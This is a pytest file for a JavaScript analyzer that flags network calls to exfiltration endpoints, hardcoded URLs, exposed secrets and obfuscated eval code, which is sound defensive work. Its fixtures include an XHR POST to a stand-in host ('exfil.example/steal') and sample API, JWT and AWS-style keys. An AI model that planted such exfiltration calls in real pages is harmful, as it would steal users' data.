"""Testes do analisador de JavaScript (analyzers.javascript_analyzer)."""

from __future__ import annotations

from analyzers.javascript_analyzer import analyze_javascript


def test_detects_fetch_calls(sample_js: str) -> None:
    result = analyze_javascript(sample_js)
    fetch_calls = [c for c in result.network_calls if c.call_type == "fetch"]
    assert len(fetch_calls) == 1
    assert fetch_calls[0].destination == "https://collector.evil-domain.test/api/collect"


def test_detects_axios_and_jquery_ajax_calls(sample_js: str) -> None:
    result = analyze_javascript(sample_js)
    axios_calls = [c for c in result.network_calls if c.call_type == "axios"]
    ajax_calls = [c for c in result.network_calls if c.call_type == "jquery_ajax"]

    assert any(c.destination == "https://collector.evil-domain.test/api/v2/otp" for c in axios_calls)
    assert any(c.destination == "https://collector.evil-domain.test/legacy/collect" for c in ajax_calls)


def test_detects_xhr_open_calls() -> None:
    js = 'var xhr = new XMLHttpRequest(); xhr.open("POST", "https://exfil.example/steal");'
    result = analyze_javascript(js)
    xhr_calls = [c for c in result.network_calls if c.call_type == "xhr"]
    assert len(xhr_calls) == 1
    assert xhr_calls[0].destination == "https://exfil.example/steal"


def test_extracts_hardcoded_urls_deduplicated() -> None:
    js = 'var a = "https://a.example/x"; var b = "https://a.example/x"; var c = "https://b.example/y";'
    result = analyze_javascript(js)
    assert result.hardcoded_urls == ["https://a.example/x", "https://b.example/y"]


def test_detects_exposed_api_key_with_truncated_preview(sample_js: str) -> None:
    result = analyze_javascript(sample_js)
    api_key_exposures = [s for s in result.exposed_secrets if s.kind == "api_key"]
    assert len(api_key_exposures) == 1
    assert "sk_live_1234567890abcdef" not in api_key_exposures[0].value_preview
    assert api_key_exposures[0].value_preview.startswith("sk_liv")


def test_detects_jwt_and_aws_key_exposures() -> None:
    js = (
        'var token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";'
        'var awsKey = "AKIAABCDEFGHIJKLMNOP";'
    )
    result = analyze_javascript(js)
    kinds = {secret.kind for secret in result.exposed_secrets}
    assert "jwt" in kinds
    assert "aws_access_key" in kinds


def test_detects_suspicious_strings() -> None:
    js = 'eval(atob("c29tZXRoaW5n")); document.write("<img src=x>");'
    result = analyze_javascript(js)
    assert len(result.suspicious_strings) >= 2


def test_script_hash_is_deterministic() -> None:
    js = "console.log('hello');"
    result_a = analyze_javascript(js)
    result_b = analyze_javascript(js)
    assert result_a.script_hash == result_b.script_hash
    assert len(result_a.script_hash) == 64


def test_external_resources_combine_calls_and_hardcoded_urls(sample_js: str) -> None:
    result = analyze_javascript(sample_js)
    assert "https://collector.evil-domain.test/api/collect" in result.external_resources
